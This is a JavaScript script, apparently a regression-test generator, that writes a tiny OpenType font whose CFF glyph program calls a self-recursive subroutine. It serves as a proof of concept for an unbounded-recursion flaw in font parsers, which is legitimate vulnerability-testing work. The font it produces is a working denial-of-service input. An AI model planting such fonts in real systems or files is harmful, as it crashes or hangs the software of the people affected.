/**
 * Generates a minimal CFF OpenType font with circular subroutine references.
 * This is a proof-of-concept for CVE: CFF Charstring VM Unbounded Subroutine Recursion.
 *
 * The font has one glyph (index 1) whose charstring calls local subroutine 0,
 * which in turn calls itself recursively via `callsubr`, creating infinite recursion.
 *
 * Usage: node test/generate-recursive-cff-font.mjs
 * Output: test/fonts/CFFRecursionTest.otf
 */

import { writeFileSync } from 'fs';

// --- Byte-level helpers (big-endian) ---

function u8(v) { return [v & 0xFF]; }
function u16(v) { return [(v >> 8) & 0xFF, v & 0xFF]; }
function u32(v) { return [(v >> 24) & 0xFF, (v >> 16) & 0xFF, (v >> 8) & 0xFF, v & 0xFF]; }
function i16(v) { return u16(v < 0 ? v + 0x10000 : v); }
function tag(s) { return [...s].map(c => c.charCodeAt(0)); }
function pad4(bytes) {
    while (bytes.length % 4 !== 0) bytes.push(0);
    return bytes;
}

// CFF number encoding (Type 2 charstring format)
function cffInt(v) {
    if (v >= -107 && v <= 107) return [v + 139];
    if (v >= 108 && v <= 1131) { v -= 108; return [((v >> 8) + 247), v & 0xFF]; }
    if (v >= -1131 && v <= -108) { v = -v - 108; return [((v >> 8) + 251), v & 0xFF]; }
    return [28, (v >> 8) & 0xFF, v & 0xFF]; // 16-bit
}

// CFF DICT number encoding (different from charstring)
function dictInt(v) {
    if (v >= -107 && v <= 107) return [v + 139];
    if (v >= 108 && v <= 1131) { v -= 108; return [((v >> 8) + 247), v & 0xFF]; }
    if (v >= -1131 && v <= -108) { v = -v - 108; return [((v >> 8) + 251), v & 0xFF]; }
    // 5-byte integer
    return [29, (v >> 24) & 0xFF, (v >> 16) & 0xFF, (v >> 8) & 0xFF, v & 0xFF];
}

// CFF INDEX structure: count(2) + offSize(1) + offsets(offSize*(count+1)) + data
function cffIndex(items) {
    if (items.length === 0) return [...u16(0)];
    const totalDataLen = items.reduce((s, d) => s + d.length, 0);
    const offSize = totalDataLen + 1 <= 0xFF ? 1 : totalDataLen + 1 <= 0xFFFF ? 2 : 4;
    const result = [...u16(items.length), u8(offSize)];
    let offset = 1;
    for (let i = 0; i <= items.length; i++) {
        if (offSize === 1) result.push(offset & 0xFF);
        else if (offSize === 2) result.push(...u16(offset));
        else result.push(...u32(offset));
        if (i < items.length) offset += items[i].length;
    }
    for (const item of items) result.push(...item);
    return result;
}

// --- Build the CFF table ---

function buildCFF() {
    const fontName = 'RecTest'; // Short to keep things small

    // --- Header ---
    const header = [1, 0, 4, 1]; // major=1, minor=0, hdrSize=4, offSize=1

    // --- Name INDEX ---
    const nameIndex = cffIndex([[...tag(fontName)]]);

    // --- String INDEX (empty - use only standard strings) ---
    const stringIndex = cffIndex([]);

    // --- Charstrings ---
    // Glyph 0 (.notdef): just endchar
    const notdefCharstring = [14]; // endchar

    // Glyph 1: pushes biased index for subr 0 then calls callsubr, creating a cycle
    // With < 1240 subrs, bias = 107. To call subr 0: push (0 - 107) = -107 then callsubr(10)
    const glyph1Charstring = [...cffInt(-107), 10]; // push -107, callsubr

    const charStringIndex = cffIndex([notdefCharstring, glyph1Charstring]);

    // --- Local Subrs INDEX ---
    // Subr 0: calls itself. Push -107 (= subr 0 with bias 107), callsubr
    const subr0 = [...cffInt(-107), 10]; // push -107, callsubr (calls subr 0 again)
    const localSubrsIndex = cffIndex([subr0]);

    // --- Private DICT ---
    // The Subrs operator (19) value is an offset relative to the Private DICT start.
    function buildPrivateDict(subrsOffset) {
        return [...dictInt(subrsOffset), u8(19)];
    }

    // --- Global Subrs INDEX (empty) ---
    const gsubrsIndex = cffIndex([]);

    function buildTopDict(charstringsOffset, privateDictSize, privateDictOffset) {
        return [
            ...dictInt(charstringsOffset), u8(17),  // charStrings offset
            ...dictInt(privateDictSize), ...dictInt(privateDictOffset), u8(18),  // Private [size, offset]
        ];
    }

    // CFF layout: header | nameIndex | topDictIndex | stringIndex | gsubrsIndex | charstrings | privateDict | localSubrs
    // Two-pass offset calculation: first pass gets approximate offsets, second pass finalizes
    // (needed because Top DICT size depends on the offset values it encodes).
    const fixedPrefix = header.length + nameIndex.length;
    const fixedSuffix = stringIndex.length + gsubrsIndex.length;

    // Private DICT: Subrs offset = its own size (local subrs immediately follow)
    const finalPrivateDict = buildPrivateDict(buildPrivateDict(0).length);

    // Two-pass offset resolution: Top DICT encodes offsets as variable-length integers,
    // so its size depends on the values, which depend on its size.
    // Pass 1 uses placeholders, pass 2 uses real offsets (which are close in magnitude,
    // so Top DICT size stabilizes).
    let topDictIndex;
    for (let pass = 0; pass < 2; pass++) {
        const csOffset = fixedPrefix + (topDictIndex ? topDictIndex.length : 10) + fixedSuffix;
        const pdOffset = csOffset + charStringIndex.length;
        topDictIndex = cffIndex([buildTopDict(csOffset, finalPrivateDict.length, pdOffset)]);
    }

    // Verify self-consistency
    const charstringsOffset = fixedPrefix + topDictIndex.length + fixedSuffix;
    const privateDictOffset = charstringsOffset + charStringIndex.length;
    const verifyIndex = cffIndex([buildTopDict(charstringsOffset, finalPrivateDict.length, privateDictOffset)]);
    if (verifyIndex.length !== topDictIndex.length) {
        throw new Error('CFF Top DICT offset calculation did not converge');
    }

    const cff = [
        ...header,
        ...nameIndex,
        ...topDictIndex,
        ...stringIndex,
        ...gsubrsIndex,
        ...charStringIndex,
        ...finalPrivateDict,
        ...localSubrsIndex,
    ];

    return cff;
}

// --- Build minimal OTF wrapper ---

function buildOTF() {
    const numGlyphs = 2;
    const unitsPerEm = 1000;

    // --- Required tables ---

    // head table (54 bytes)
    const headTable = [
        ...u16(1), ...u16(0),          // version 1.0
        ...u16(1), ...u16(0),          // fontRevision 1.0
        ...u32(0),                      // checksumAdjustment (filled later)
        ...u32(0x5F0F3CF5),            // magicNumber
        ...u16(0x000B),                // flags
        ...u16(unitsPerEm),            // unitsPerEm
        ...u32(0), ...u32(0),          // created (longDateTime)
        ...u32(0), ...u32(0),          // modified (longDateTime)
        ...i16(0), ...i16(0),          // xMin, yMin
        ...i16(1000), ...i16(1000),    // xMax, yMax
        ...u16(0),                      // macStyle
        ...u16(8),                      // lowestRecPPEM
        ...i16(2),                      // fontDirectionHint
        ...i16(1),                      // indexToLocFormat
        ...i16(0),                      // glyphDataFormat
    ];

    // hhea table (36 bytes)
    const hheaTable = [
        ...u16(1), ...u16(0),          // version 1.0
        ...i16(800),                    // ascender
        ...i16(-200),                   // descender
        ...i16(0),                      // lineGap
        ...u16(1000),                   // advanceWidthMax
        ...i16(0),                      // minLeftSideBearing
        ...i16(0),                      // minRightSideBearing
        ...i16(1000),                   // xMaxExtent
        ...i16(1),                      // caretSlopeRise
        ...i16(0),                      // caretSlopeRun
        ...i16(0),                      // caretOffset
        ...i16(0), ...i16(0), ...i16(0), ...i16(0), // reserved
        ...i16(0),                      // metricDataFormat
        ...u16(numGlyphs),             // numberOfHMetrics
    ];

    // maxp table (6 bytes for CFF)
    const maxpTable = [
        ...u16(0), ...u16(0x5000),     // version 0.5
        ...u16(numGlyphs),             // numGlyphs
    ];

    // OS/2 table (minimal, 78 bytes for version 1)
    const os2Table = [
        ...u16(1),                      // version
        ...i16(500),                    // xAvgCharWidth
        ...u16(400),                    // usWeightClass
        ...u16(5),                      // usWidthClass
        ...u16(0),                      // fsType
        ...i16(0), ...i16(0), ...i16(0), ...i16(0), ...i16(0), // subscript/superscript
        ...i16(0), ...i16(0),          // strikeout
        ...i16(0),                      // sFamilyClass (byte, but i16)
        ...Array(10).fill(0),           // panose
        ...u32(0), ...u32(0), ...u32(0), ...u32(0), // ulUnicodeRange
        ...tag('    '),                 // achVendID
        ...u16(0),                      // fsSelection
        ...u16(0x0020),                // usFirstCharIndex
        ...u16(0x0020),                // usLastCharIndex
        ...i16(800),                    // sTypoAscender
        ...i16(-200),                   // sTypoDescender
        ...i16(0),                      // sTypoLineGap
        ...u16(800),                    // usWinAscent
        ...u16(200),                    // usWinDescent
        ...u32(0),                      // ulCodePageRange1
        ...u32(0),                      // ulCodePageRange2
    ];

    // name table (minimal - just required nameIDs with short strings)
    function buildNameTable() {
        const names = [
            [0, 'Copyright'],
            [1, 'Test'],
            [2, 'Regular'],
            [4, 'Test'],
            [5, 'Version 1.0'],
            [6, 'Test-Regular'],
        ];
        const stringData = [];
        const records = [];
        let offset = 0;
        for (const [nameID, str] of names) {
            // Platform 3 (Windows), encoding 1 (Unicode BMP), language 0x0409 (English)
            const encoded = [];
            for (const ch of str) {
                encoded.push(0, ch.charCodeAt(0));
            }
            records.push([3, 1, 0x0409, nameID, encoded.length, offset]);
            stringData.push(...encoded);
            offset += encoded.length;
        }
        const count = records.length;
        const storageOffset = 6 + count * 12;
        const result = [...u16(0), ...u16(count), ...u16(storageOffset)];
        for (const [platID, encID, langID, nameID, len, off] of records) {
            result.push(...u16(platID), ...u16(encID), ...u16(langID), ...u16(nameID), ...u16(len), ...u16(off));
        }
        result.push(...stringData);
        return result;
    }
    const nameTable = buildNameTable();

    // cmap table (format 4, maps space U+0020 to glyph 1)
    function buildCmapTable() {
        const segCount = 2; // one real segment + sentinel
        const searchRange = 2 * Math.pow(2, Math.floor(Math.log2(segCount)));
        const entrySelector = Math.floor(Math.log2(segCount));
        const rangeShift = 2 * segCount - searchRange;

        const subtable = [
            ...u16(4),                     // format
            ...u16(0),                     // length (filled below)
            ...u16(0),                     // language
            ...u16(segCount * 2),          // segCountX2
            ...u16(searchRange),
            ...u16(entrySelector),
            ...u16(rangeShift),
            // endCode
            ...u16(0x0020), ...u16(0xFFFF),
            // reservedPad
            ...u16(0),
            // startCode
            ...u16(0x0020), ...u16(0xFFFF),
            // idDelta
            ...i16(1 - 0x0020), ...i16(1),
            // idRangeOffset
            ...u16(0), ...u16(0),
        ];
        // Fix length
        subtable[2] = (subtable.length >> 8) & 0xFF;
        subtable[3] = subtable.length & 0xFF;

        return [
            ...u16(0),                     // version
            ...u16(1),                     // numTables
            ...u16(3), ...u16(1),          // platformID=3, encodingID=1
            ...u32(12),                    // offset to subtable
            ...subtable,
        ];
    }
    const cmapTable = buildCmapTable();

    // post table (format 3 - no glyph names, 32 bytes)
    const postTable = [
        ...u16(0x0003), ...u16(0x0000), // format 3.0
        ...u16(0), ...u16(0),           // italicAngle
        ...i16(-100),                    // underlinePosition
        ...i16(50),                      // underlineThickness
        ...u32(0),                       // isFixedPitch
        ...u32(0), ...u32(0),           // minMemType42, maxMemType42
        ...u32(0), ...u32(0),           // minMemType1, maxMemType1
    ];

    // hmtx table
    const hmtxTable = [
        ...u16(500), ...i16(0),         // glyph 0: advanceWidth=500, lsb=0
        ...u16(500), ...i16(0),         // glyph 1: advanceWidth=500, lsb=0
    ];

    // CFF table
    const cffTable = buildCFF();

    // --- Assemble OTF ---
    const tables = [
        ['CFF ', cffTable],
        ['OS/2', os2Table],
        ['cmap', cmapTable],
        ['head', headTable],
        ['hhea', hheaTable],
        ['hmtx', hmtxTable],
        ['maxp', maxpTable],
        ['name', nameTable],
        ['post', postTable],
    ];

    const numTables = tables.length;
    const searchRange2 = Math.pow(2, Math.floor(Math.log2(numTables))) * 16;
    const entrySelector2 = Math.floor(Math.log2(numTables));
    const rangeShift2 = numTables * 16 - searchRange2;

    // OTF header
    const sfntHeader = [
        ...tag('OTTO'),                 // sfVersion (CFF)
        ...u16(numTables),
        ...u16(searchRange2),
        ...u16(entrySelector2),
        ...u16(rangeShift2),
    ];

    // Calculate table offsets
    const tableRecordSize = 16; // tag(4) + checksum(4) + offset(4) + length(4)
    let dataOffset = sfntHeader.length + numTables * tableRecordSize;

    const tableEntries = [];
    for (const [name, data] of tables) {
        const paddedLen = Math.ceil(data.length / 4) * 4;
        tableEntries.push({ tag: name, data, offset: dataOffset, length: data.length });
        dataOffset += paddedLen;
    }

    // Build table records
    function checksum(bytes) {
        let sum = 0;
        const padded = [...bytes];
        while (padded.length % 4 !== 0) padded.push(0);
        for (let i = 0; i < padded.length; i += 4) {
            sum = (sum + ((padded[i] << 24) | (padded[i+1] << 16) | (padded[i+2] << 8) | padded[i+3])) >>> 0;
        }
        return sum;
    }

    const records = [];
    for (const entry of tableEntries) {
        records.push(...tag(entry.tag));
        records.push(...u32(checksum(entry.data)));
        records.push(...u32(entry.offset));
        records.push(...u32(entry.length));
    }

    // Assemble final file
    const file = [...sfntHeader, ...records];
    for (const entry of tableEntries) {
        file.push(...pad4([...entry.data]));
    }

    return new Uint8Array(file);
}

const otf = buildOTF();
const outputPath = new URL('./fonts/CFFRecursionTest.otf', import.meta.url).pathname;
writeFileSync(outputPath, otf);
console.log(`Written ${otf.length} bytes to ${outputPath}`);
